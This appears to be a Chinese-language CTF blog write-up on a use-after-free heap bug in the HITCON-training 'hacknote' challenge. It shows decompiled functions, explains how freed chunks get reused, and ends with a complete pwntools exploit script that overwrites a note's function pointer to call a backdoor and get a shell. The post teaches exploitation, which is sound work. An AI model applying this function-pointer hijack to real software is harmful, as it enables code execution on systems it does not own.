@@ -1,0 +1,311 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>UAF (Hacknote) | Bin Fantasy🤯</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="​        从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="UAF (Hacknote)">
+<meta property="og:url" content="http://example.com/2020/02/28/UAF-Hacknote/index.html">
+<meta property="og:site_name" content="Bin Fantasy🤯">
+<meta property="og:description" content="​        从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。">
+<meta property="og:locale">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png">
+<meta property="og:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png">
+<meta property="article:published_time" content="2020-02-28T03:14:08.000Z">
+<meta property="article:modified_time" content="2020-03-02T06:50:16.206Z">
+<meta property="article:author" content="Ash3n On3">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png">
+  
+    <link rel="alternate" href="/atom.xml" title="Bin Fantasy🤯" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/plugin/bganimation/bg.css">
+
+  
+
+  <link href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css" rel="stylesheet" type="text/css">
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <div class="outer">
+        <div class="widget-wrap mobile-header">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+        <section id="main"><article id="post-UAF-Hacknote" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2020/02/28/UAF-Hacknote/" class="article-date">
+  <time class="post-time" datetime="2020-02-28T03:14:08.000Z" itemprop="datePublished">
+    <span class="post-month">2月</span><br/>
+    <span class="post-day">28</span>
+  </time>
+</a>
+   
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      UAF (Hacknote)
+    </h1>
+  
+
+        <div>
+          
+          
+              
+
+          
+        </div>
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>​        从头开始学习堆堆堆堆😥😥😥（其实之前也没学多少）。<span id="more"></span></p>
+<p>​        课设做很久了，摸鱼划水也很久了，抓紧时间系统地肝一下堆题吧。再不好好学要废了。。</p>
+<h2 id="1-关于UAF"><a href="#1-关于UAF" class="headerlink" title="1.关于UAF"></a>1.关于UAF</h2><p>​        在malloc得到一个指针并使用后，通常要将其释放并置空。若是出现未将其置空的情况，就容易出现可利用的漏洞，使得用户仍然可以运用指针内的数据或是调用其中的指令。简单来说i，UAF就是对一个已释放内存块的再利用。</p>
+<h3 id="CTF-wiki-相关如下："><a href="#CTF-wiki-相关如下：" class="headerlink" title="CTF - wiki 相关如下："></a>CTF - wiki 相关如下：</h3><ul>
+<li><p>内存块被释放后，其对应的指针被设置为 NULL ， 然后再次使用，自然程序会崩溃。</p>
+</li>
+<li><p>内存块被释放后，其对应的指针没有被设置为 NULL ，然后在它下一次被使用之前，没有代码对这块内存块进行修改，那么<strong>程序很有可能可以正常运转</strong>。</p>
+</li>
+<li><p>内存块被释放后，其对应的指针没有被设置为 NULL，但是在它下一次使用之前，有代码对这块内存进行了修改，那么当程序再次使用这块内存时，<strong>就很有可能会出现奇怪的问题</strong>。</p>
+<p>（Link  - <a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/%EF%BC%89">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/use_after_free-zh/）</a></p>
+<h3 id="Example-from-how2heap"><a href="#Example-from-how2heap" class="headerlink" title="Example from how2heap"></a>Example from how2heap</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">name</span> &#123;</span>  </span><br><span class="line"><span class="keyword">char</span> *myname;  </span><br><span class="line"><span class="built_in"><span class="keyword">void</span></span> (*func)(<span class="keyword">char</span> *str); &#125; NAME; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">myprint</span><span class="params">(<span class="keyword">char</span> *str)</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, str); &#125; </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printmyname</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; <span class="built_in">printf</span>(<span class="string">&quot;call print my name\n&quot;</span>); &#125; </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    NAME *a;  a = (NAME *)<span class="built_in">malloc</span>(<span class="built_in"><span class="keyword">sizeof</span></span>(struct name));  </span><br><span class="line">    a-&gt;func = myprint;  </span><br><span class="line">    a-&gt;myname = <span class="string">&quot;I can also use it&quot;</span>;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// free without modify  free(a);  </span></span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;I can also use it&quot;</span>);  </span><br><span class="line">    <span class="comment">// free with modify  </span></span><br><span class="line">    a-&gt;func = printmyname;  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;this is my function&quot;</span>);  </span><br><span class="line">    <span class="comment">// set NULL  a = NULL;  </span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;this pogram will crash...\n&quot;</span>);  </span><br><span class="line">    a-&gt;<span class="built_in">func</span>(<span class="string">&quot;can not be printed...&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*The output:</span></span><br><span class="line"><span class="comment">$use_after_free git:(use_after_free) ✗ ./use_after_free        this is my function</span></span><br><span class="line"><span class="comment">I can also use it</span></span><br><span class="line"><span class="comment">call print my name</span></span><br><span class="line"><span class="comment">this pogram will crash...</span></span><br><span class="line"><span class="comment">[1]    38738 segmentation fault (core dumped)  ./use_after_free</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></li>
+</ul>
+<h2 id="2-hacknote复现"><a href="#2-hacknote复现" class="headerlink" title="2.hacknote复现"></a>2.hacknote复现</h2><p>​        (Link - <a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/use_after_free/hitcon-training-hacknote</a>)</p>
+<h4 id="A-题目分析"><a href="#A-题目分析" class="headerlink" title="A.题目分析"></a>A.题目分析</h4><p>​        常规操作：丢Ubuntu 1.checksec 2.file（其实有保护也不会绕过。。。tcl）</p>
+<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(1).png" alt="heap 1" style="zoom: 47%;" /> </div>  
+​        然后丢IDA看源码和伪码：
+
+<img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(2).png" alt="exploit function" style="zoom:100%;" />
+
+<p>​        主要函数有这几个，添加删除输出主函数，magic()是喜闻乐见的system后门。菜鸡看到后门函数的第一直觉就是改got表，或者ROP。。。但这里好像不太行，怎么说也是个正经堆题啊。</p>
+<p>​        add_note:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">add_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+Ch] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> size; <span class="comment">// [esp+10h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+14h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( count &lt;= <span class="number">5</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">      &#123;</span><br><span class="line">        notelist[i] = <span class="built_in">malloc</span>(<span class="number">8u</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !notelist[i] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        *notelist[i] = print_note_content;      <span class="comment">// put字段，*notelist[i]为函数指针</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Note size :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">8u</span>);</span><br><span class="line">        size = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">        v0 = notelist[i];</span><br><span class="line">        v0[<span class="number">1</span>] = <span class="built_in">malloc</span>(size);</span><br><span class="line">        <span class="keyword">if</span> ( !*(notelist[i] + <span class="number">1</span>) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;Alloca Error&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Content :&quot;</span>);</span><br><span class="line">        <span class="built_in">read</span>(<span class="number">0</span>, *(notelist[i] + <span class="number">1</span>), size);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Success !&quot;</span>);</span><br><span class="line">        ++count;</span><br><span class="line">        <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        print_note:调用了note中的函数指针，即print_content_function()函数</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">print_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">    (*notelist[v1])(notelist[v1]);              <span class="comment">// 调用notelist[v1]所指函数</span></span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;             <span class="comment">// 因此利用思路为：改写notelist[v1]之所指</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        del_note:在此函数中发现，函数仅对堆进行free，但并未置空，因此存在UAF漏洞。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">del_note</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  <span class="built_in">read</span>(<span class="number">0</span>, &amp;buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = <span class="built_in">atoi</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( notelist[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*(notelist[v1] + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(notelist[v1]);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        还有要注意的是，对于每个note，都有一个notelist函数指针ptr，指向print_note_content()。并在新建note的时候就会被初始化为print_note_content(),所以无法对于单个note的ptr进行改写。</p>
+<p>print_note_content:</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">print_note_content</span><span class="params">(<span class="keyword">int</span> a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(*(a1 + <span class="number">4</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>​        也就是说每一个note，都包含了两个chunk，第一个（8 bytes）存的是函数指针ptr，另一个是指向内容的指针ptr_content。第二个存的是用户输入的content。</p>
+<h3 id="B-利用思路"><a href="#B-利用思路" class="headerlink" title="B.利用思路"></a>B.利用思路</h3><p>​        1.能由用户控制的内容只有content，所以基本思路就是用一个note_a的输入过程，去改写note_b的函数指针ptr，再print(note_b)</p>
+<p>​        2.要使得note_b被note_a改写，除非后者进行堆溢出，或者两者再某一时刻同时指向同一块内存区域。因此可以想到利用UAF漏洞，先free(note_b)再add(note_a)，将payload写入到note_a中。</p>
+<p>​        3.如果有两个相邻的note，四个相邻的chunk，结构如下：</p>
+<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(3).png" alt="heap 1" style="zoom: 37%;" /> </div>
+- 对于函数指针和内容指针，各占4 Bytes，再加上其他chunk数据并遵循堆内存对齐，可知chunk1和chunk3分别为16 Bytes。
+
+<ul>
+<li><p>分别free之后bin链表内容为：(head) chunk1 –&gt; chunk2 –&gt; chunk3 –&gt; chunk4 (tail)此时再申请出note2，作为改写用的note_a。</p>
+</li>
+<li><p>而在malloc时，如果chunk2和chunk4的大小(即size of content)大于16 Bytes，且note_a大小小于16 Bytes，系统就会从bin链表尾部向头部寻找适当大小的已释放chunk，进而将chunk3和chunk1分配给note_a，而chunk3和chunk1中的两个指针正是我们要改写的地方。</p>
+</li>
+<li><p>所以我们知道，需要给note0和note1的content部分分配32bytes的大小。</p>
+<div align="center"><img src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/UAF-Hacknote/(4).png" alt="heap 2" style="zoom:37%;" /></div>
+​    4.内存分配情况决定之后，只需要将note0视作note_b，在note_a中写入payload（note_a的content部分与note_b的content部分为同一内存块），即可改写note_b的函数指针。调用函数print(note_b)即可getshell。</li>
+</ul>
+<h3 id="C-exp"><a href="#C-exp" class="headerlink" title="C.exp:"></a>C.exp:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">addnote</span>(<span class="params">size, content</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printnote</span>(<span class="params">idx</span>):</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;aaaa&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">32</span>, <span class="string">&quot;ddaa&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2020/02/28/UAF-Hacknote/" data-id="ckmlis0z5000as0ljhvq0hplv" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2020/02/29/Fastbin%20attack%20-%20Babyheap/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          Fastbin attack (Babyheap)
+        
+      </div>
+    </a>
+  
+  
+</nav>
+
+  
+</article>
+
+
+
+</section>
+        
+          <aside id="sidebar">
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <h1 class="blog-title">Bin Fantasy🤯</h1>
+    <h2 class="blog-subtitle">You may found nothing here.</h2>
+    <ul class="blog-link">
+     
+          <a href="/" title="Home">
+            <li>主页</li>
+          </a>
+        
+          <a href="/archives" title="Archives">
+            <li>归档</li>
+          </a>
+        
+          <a href="/categories" title="Categories">
+            <li>分类</li>
+          </a>
+        
+          <a href="/tags" title="Tags">
+            <li>标签</li>
+          </a>
+        
+    </ul>
+  </div>
+</div>
+
+  
+    <div class="widget-wrap">
+  <h3 class="widget-title"></h3>
+  <div class="widget">
+    <img class="avatar" src="https://raw.githubusercontent.com/ash3n-on3/For-blog-photos/master/avatar/avatar%20(3).jpg">
+    <h2 class="author">Ash3n On3</h2>
+    <h3 class="description"></h3>
+    <div class="count-box">
+      <a href="/archives"><div><strong>14</strong><br>文章</div></a>
+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
